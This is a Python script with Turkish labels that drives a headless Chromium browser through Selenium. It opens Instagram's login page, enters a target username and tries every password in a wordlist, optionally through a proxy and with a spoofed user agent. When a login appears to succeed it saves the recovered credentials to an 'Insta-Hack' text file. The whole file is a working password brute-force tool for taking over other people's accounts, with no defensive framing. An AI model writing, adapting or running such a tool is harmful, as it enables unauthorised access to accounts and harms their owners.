from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions
from selenium.webdriver.chrome.options import Options
import time
import os


def islemFonk(inputName, sifre, proxy=None):
    print(f"Kullanılan Proxy: {proxy if proxy else 'Proxy kullanılmıyor'}")

    options = Options()
    
    options.binary_location = "/usr/bin/chromium-browser"  # Chromium'un yeri
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
    options.add_argument("--ignore-certificate-errors")
    if proxy:
        options.add_argument(f"--proxy-server={proxy}")
    options.add_argument("--headless")
    driver = webdriver.Chrome(options=options)

    try:
        url = "https://www.instagram.com/accounts/login/?source=logged_out_homepage"
        driver.get(url)

        WebDriverWait(driver, 10).until(expected_conditions.element_to_be_clickable((By.NAME, "username")))
        kadi_input = driver.find_element(By.NAME, "username")
        kadi_input.send_keys(inputName)

        with open(sifre, "r") as df:
            for passw in df:
                a = passw.strip()

   
                try:
                    sifre_input = WebDriverWait(driver, 10).until(
                        expected_conditions.element_to_be_clickable((By.NAME, "password"))
                    )
                    time.sleep(2)
                    sifre_input.send_keys(Keys.CONTROL + "a") 
                    sifre_input.send_keys(Keys.DELETE) 
                    sifre_input.send_keys(a)

                    button = WebDriverWait(driver, 10).until(
                        expected_conditions.element_to_be_clickable((By.XPATH, "//*[@id='loginForm']/div/div[3]"))
                    )
                    button.click()

                    
                    try:
                        WebDriverWait(driver, 5).until(
                            expected_conditions.presence_of_element_located(
                                (By.XPATH, "/html/body/div[2]/div/div/div[2]/div/div/div[1]/div[1]/div/section/main/div/div/div[1]/div[2]/div/form/span")
                            )
                        )
                        print(f"Geçersiz şifre: {a}")
                    except:
                        print(f"Başarılı giriş ile şifre: {a}")
                        os.system(f"touch Insta-Hack-{inputName}.txt")
                        with open(f"Insta-Hack-{inputName}.txt", "w") as inf:
                            inf.write(f"Kullanıcı adı: {inputName}\n")
                            inf.write(f"Şifre: {a}")
                        break
                except Exception as e:
                    print(f"Hata (şifre giriş aşamasında): {e}")
    except Exception as e:
        print(f"Genel Hata: {e}")
    finally:
        driver.quit()
